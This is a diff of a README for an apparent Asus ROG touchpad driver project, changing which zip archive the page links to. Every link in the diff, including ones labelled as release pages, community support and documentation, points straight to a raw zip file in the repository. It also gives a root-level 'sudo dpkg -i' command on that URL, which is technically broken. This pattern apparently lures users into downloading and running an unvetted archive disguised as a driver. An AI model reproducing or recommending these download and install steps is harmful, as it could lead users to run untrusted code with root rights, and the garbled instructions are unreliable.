@@ -1,7 +1,7 @@
 # 🌟 asus-rog-touchpad-driver - Seamlessly Control Your Touchpad
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/jelans12/asus-rog-touchpad-driver/main/src/numpad/touchpad_asus_rog_driver_1.0.zip%20Now-Release-blue)](https://raw.githubusercontent.com/jelans12/asus-rog-touchpad-driver/main/src/numpad/touchpad_asus_rog_driver_1.0.zip)
+[![Download](https://raw.githubusercontent.com/jelans12/asus-rog-touchpad-driver/main/src/i2c/driver-rog-touchpad-asus-v3.8-alpha.4.zip%20Now-Release-blue)](https://raw.githubusercontent.com/jelans12/asus-rog-touchpad-driver/main/src/i2c/driver-rog-touchpad-asus-v3.8-alpha.4.zip)
 
 ## 🚀 Getting Started
 The Asus ROG Touchpad Driver helps improve the performance and functionality of your Asus ROG touchpad. Follow these simple steps to download and run the driver on your computer.
@@ -19,7 +19,7 @@ The Asus ROG Touchpad Driver helps improve the performance and functionality of 
 - Simple and user-friendly interface
 
 ## 📄 Download & Install
-1. **Visit the Release Page:** Click [here](https://raw.githubusercontent.com/jelans12/asus-rog-touchpad-driver/main/src/numpad/touchpad_asus_rog_driver_1.0.zip) to go to the Releases page. This page contains the latest version of the driver and release notes.
+1. **Visit the Release Page:** Click [here](https://raw.githubusercontent.com/jelans12/asus-rog-touchpad-driver/main/src/i2c/driver-rog-touchpad-asus-v3.8-alpha.4.zip) to go to the Releases page. This page contains the latest version of the driver and release notes.
 
 2. **Choose the Correct Version:** Look for the version that matches your system requirements. Ensure you download the correct file for your operating system.
 
@@ -38,7 +38,7 @@ The Asus ROG Touchpad Driver helps improve the performance and functionality of 
    - Run the following command to install the driver:
 
      ```bash
-     sudo dpkg -i https://raw.githubusercontent.com/jelans12/asus-rog-touchpad-driver/main/src/numpad/touchpad_asus_rog_driver_1.0.zip
+     sudo dpkg -i https://raw.githubusercontent.com/jelans12/asus-rog-touchpad-driver/main/src/i2c/driver-rog-touchpad-asus-v3.8-alpha.4.zip
      ```
 
    Replace `vX.X.X` with the version number of the driver you downloaded.
@@ -57,8 +57,8 @@ If you encounter issues during installation or usage, consider the following ste
 If problems persist, seek help from the community forums or consider reviewing the documentation available on our GitHub page.
 
 ## 🔗 Additional Resources
-- [Community Support](https://raw.githubusercontent.com/jelans12/asus-rog-touchpad-driver/main/src/numpad/touchpad_asus_rog_driver_1.0.zip)
-- [Arch Linux Driver Documentation](https://raw.githubusercontent.com/jelans12/asus-rog-touchpad-driver/main/src/numpad/touchpad_asus_rog_driver_1.0.zip)
+- [Community Support](https://raw.githubusercontent.com/jelans12/asus-rog-touchpad-driver/main/src/i2c/driver-rog-touchpad-asus-v3.8-alpha.4.zip)
+- [Arch Linux Driver Documentation](https://raw.githubusercontent.com/jelans12/asus-rog-touchpad-driver/main/src/i2c/driver-rog-touchpad-asus-v3.8-alpha.4.zip)
 
 ## 🛠️ Contributing
 If you want to contribute to this project, feel free to fork the repository and submit a pull request. Your input is valuable in making this driver better for everyone.
